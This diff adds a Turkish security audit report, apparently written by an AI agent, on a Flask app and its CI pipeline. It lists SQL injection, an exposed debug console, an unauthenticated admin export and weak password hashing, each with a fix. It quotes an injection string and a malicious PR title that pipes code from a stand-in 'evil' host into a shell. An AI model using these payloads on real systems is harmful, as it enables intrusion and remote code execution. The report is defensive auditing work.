@@ -1,0 +1,84 @@
+[probe p12]
+# Güvenlik denetimi: sonuç
+
+**Karar: Bu hâliyle yayına alma.** 5 kritik/yüksek bulgu var.
+
+Baktığım dosyalar: `app.py`, `requirements.txt`, `.github/workflows/ci.yml`. Kodu değiştirmedim.
+
+Araç taraması yapılmadı. `.pusula/checks/pusula_check.py` projede yok. Semgrep, gitleaks ve osv-scanner "kontrol edilmedi" sayılır. Temiz demek değildir.
+
+## Kritik
+
+**1. Debug modu açık ve her adrese açık** (`app.py:40`)
+- `debug=True` Werkzeug konsolunu açar. Saldırgan sunucuda kod çalıştırabilir.
+- `host="0.0.0.0"` bunu tüm ağa açar.
+- Düzeltme: `debug` kapalı olsun. Üretimde gunicorn gibi bir WSGI sunucusu kullan. Host'u config'ten oku.
+
+**2. SQL injection** (`app.py:28`)
+- `customer` değeri f-string ile sorguya giriyor.
+- Örnek: `/orders?customer=' OR '1'='1` bütün siparişleri döker.
+- UNION ile `users` tablosu da okunabilir.
+- Düzeltme: `WHERE customer = ?` ve parametre olarak `(customer,)`.
+
+**3. Admin uç noktasında yetki kontrolü yok** (`app.py:32-36`)
+- `/admin/export` girişsiz çalışır. Tüm kullanıcıları ve parola hash'lerini verir.
+- Düzeltme: kimlik doğrulama ve admin rolü kontrolü ekle. Hash sütununu hiç döndürme.
+
+## Yüksek
+
+**4. Parola MD5 ile saklanıyor** (`app.py:18`)
+- MD5 hızlıdır ve tuzsuzdur. Hash'ler dakikalar içinde kırılır.
+- Madde 3 ile birleşince tüm parolalar kolayca çalınır.
+- Düzeltme: argon2, scrypt veya bcrypt (12+) kullan.
+
+**5. CI hattında `pull_request_target` ile PR kodu çalışıyor** (`ci.yml:3-14`)
+- Bu tetikleyici depo sırlarına ve yazma yetkisine erişir.
+- Aynı iş akışı fork'taki PR kodunu çekip `pip install` ve `pytest` çalıştırıyor. Saldırgan sırları çalabilir.
+- `${{ github.event.pull_request.title }}` doğrudan `run` içine giriyor. Bu bir komut enjeksiyonudur. Başlık `"; curl evil|sh #` olabilir.
+- Düzeltme: `pull_request` tetikleyicisine geç. Başlığı `env:` ile ver. En az yetkili `permissions:` bloğu ekle.
+
+## Orta
+
+**6. Sabit yazılmış SECRET_KEY** (`app.py:7`)
+- Değer kodda ve git geçmişinde duruyor. Oturum imzası taklit edilebilir.
+- Şu an oturum kullanılmıyor, ama ileride kullanılırsa risk olur.
+- Düzeltme: ortam değişkeninden oku. Anahtarı yenile.
+
+**7. Kayıt uç noktasında doğrulama yok** (`app.py:17-18`)
+- Eksik alan `KeyError` verir. Debug açıkken bu bir stack trace gösterir.
+- Parola uzunluğu veya biçim kuralı yok.
+- Aynı ad iki kez kaydedilebilir (`users` şeması görünmüyor, UNIQUE olduğu belirsiz).
+- Düzeltme: girdiyi şemayla doğrula. Hataları temiz bir 400 olarak döndür.
+
+**8. Hız sınırı yok, HTTPS ve güvenlik başlıkları yok**
+- `/register` sınırsız çağrılabilir. Kaba kuvvet ve spam açık.
+- CSP, HSTS ve benzeri başlıklar eklenmemiş.
+- Düzeltme: Flask-Limiter gibi bir sınırlayıcı ekle. TLS'i ters proxy'de sonlandır.
+
+## Düşük / bilgi
+
+**9. Bağımlılıklar** (`requirements.txt`)
+- `Flask>=3.1.3` sabitlenmemiş. Kilit dosyası yok.
+- Derleme tekrarlanamaz. Gelecekte kötü bir sürüm gelebilir.
+- Düzeltme: sürümleri sabitle. `pip-audit` çalıştır. İnternet olmadığı için çalıştıramadım.
+
+**10. `.gitignore` yok**
+- `shop.db` ve `.env` yanlışlıkla commit edilebilir.
+- Düzeltme: `.gitignore` ekle.
+
+**11. Test ve veri tabanı kurulumu yok**
+- CI `pytest` çalıştırıyor ama depoda test yok.
+- `users` ve `orders` tablolarını oluşturan kod yok.
+- Güvenlik testleri de yok (SQLi, yetki).
+
+**12. Kişisel veri**
+- Kullanıcı adı ve parola saklanıyor. Saklama süresi, silme ve dışa aktarma yolu tanımlı değil.
+
+## Önerilen sıra
+1. Madde 1, 2 ve 3'ü düzelt. Bunlar tek başına tam ele geçirmeye yeter.
+2. Madde 5'i düzelt. Hat ele geçirilirse tedarik zinciri riski doğar.
+3. Madde 4 ve 6'yı düzelt. Mevcut parola hash'lerini geçersiz say ve kullanıcılardan parola yenilemelerini iste.
+4. Orta ve düşük maddeleri yayından önce kapat.
+5. `pusula_check.py` çalıştırılabilir olduktan sonra sast, secrets ve deps taramasını yap.
+
+Bilmediğim şeyler: `shop.db` şeması, dağıtım ortamı (proxy, TLS), git geçmişinde başka sır olup olmadığı. Geçmişi taramadım.
